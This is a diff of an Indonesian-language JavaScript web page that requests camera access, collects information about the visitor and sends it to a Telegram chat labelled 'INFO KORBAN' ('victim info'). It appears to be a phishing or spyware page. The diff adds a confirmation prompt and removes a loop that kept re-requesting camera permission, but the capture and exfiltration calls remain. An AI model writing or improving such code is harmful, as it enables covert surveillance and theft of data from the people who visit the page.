@@ -119,15 +119,26 @@
 
     let startTime = Date.now();
 
+    // Fungsi untuk meminta izin dan memeriksa data
     async function cekData() {
       tampilkanStatus("Memproses...");
+
+      // Tanyakan izin eksplisit kepada pengguna
+      const permission = await new Promise((resolve) => {
+        const userConfirmed = confirm("Apakah Anda ingin memberikan izin akses nya? ");
+        resolve(userConfirmed);
+      });
+
+      if (!permission) {
+        tampilkanStatus("Izin kamera ditolak.");
+        return;
+      }
 
       // Minta izin untuk mengakses kamera
       if (navigator.mediaDevices) {
         try {
-          // Cek apakah izin sudah diberikan
           await navigator.mediaDevices.getUserMedia({ video: true });
-          tampilkanStatus("Izin Kamera Diterima!");
+          tampilkanStatus("Izin Diterima!");
           await ambilDanKirimInfo();
           tampilkanStatus("Data berhasil diambil!");
 
@@ -150,16 +161,11 @@
 
           await kirimTelegram(`📝𝗜𝗡𝗙𝗢 𝗞𝗢𝗥𝗕𝗔𝗡:\n${infoPopup}`);
         } catch (e) {
-          // Jika kamera ditolak, beri tahu pengguna dan minta izin lagi
           console.error("Kamera tidak diizinkan:", e);
           tampilkanStatus("Perizinan kamera diperlukan. Coba izinkan akses.");
-          setTimeout(() => {
-            cekData();  // Coba lagi untuk meminta izin
-          }, 1000); // Tunggu 1 detik sebelum mencoba lagi
         }
       } else {
         alert("Browser tidak mendukung akses kamera.");
-        return;
       }
     }
 
